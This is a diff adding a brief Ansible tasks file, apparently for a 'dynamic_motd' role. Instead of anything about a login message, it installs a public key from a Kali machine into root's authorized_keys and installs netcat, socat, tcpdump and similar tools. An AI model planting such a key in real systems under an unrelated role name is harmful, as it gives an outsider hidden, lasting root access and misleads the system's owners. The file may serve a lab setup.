@@ -1,0 +1,17 @@
+---
+# tasks file for dynamic_motd.  I have no idea where this format came from
+- name: Add public key from kali
+  ansible.posix.authorized_key:
+    user: "root"
+    state: present
+    key: "{{ lookup('file', '/tmp/kali_id_rsa.pub') }}"
+- name: Install utilities
+  ansible.builtin.package:
+    name: 
+      - netcat-openbsd
+      - wget
+      - curl
+      - tcpdump
+      - socat
+      - iptables
+    state: present
